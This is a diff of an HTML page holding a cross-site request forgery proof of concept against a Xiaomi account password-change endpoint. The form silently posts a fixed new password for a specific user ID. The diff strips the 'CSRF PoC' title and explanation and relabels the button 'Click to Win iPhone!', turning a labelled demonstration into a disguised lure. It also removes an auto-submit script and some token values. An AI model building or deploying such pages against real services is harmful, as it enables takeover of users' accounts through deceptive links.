@@ -2,33 +2,25 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>CSRF PoC - Change Password</title>
+    <title>Test</title>
 </head>
 <body>
-    <h1>click here</h1>
-    <p>This page demonstrates CSRF vulnerability on Xiaomi Account.</p>
+    <h1>Click Here!</h1>
     
-    <form action="https://account.xiaomi.com/pass/auth/security/changePassword" method="POST" id="hack">
+    <form action="https://account.xiaomi.com/pass/auth/security/changePassword" method="POST">
         <input type="hidden" name="userId" value="6885379517">
         <input type="hidden" name="icode" value="">
         <input type="hidden" name="password" value="HACKED123!">
         <input type="hidden" name="passToken" value="">
-        <input type="hidden" name="passport_ph" value="7F4oBwotyjj7S/NDLTf8/A==">
+        <input type="hidden" name="passport_ph" value="">
         <input type="hidden" name="usercenter_ph" value="">
-        <input type="hidden" name="passportsecurity_ph" value="A35J3objpUxgXHJRM+yo5w==">
+        <input type="hidden" name="passportsecurity_ph" value="">
         <input type="hidden" name="passportapi_ph" value="">
         <input type="hidden" name="passport_h5_ph" value="">
         
-        <button type="submit" style="font-size: 20px; padding: 20px; background: red; color: white;">
-            Click Here
+        <button type="submit" style="font-size: 20px; padding: 20px;">
+            Click to Win iPhone!
         </button>
     </form>
-    
-    <script>
-        // Auto-submit after 2 seconds
-        setTimeout(function() {
-            document.getElementById('hack').submit();
-        }, 2000);
-    </script>
 </body>
 </html>
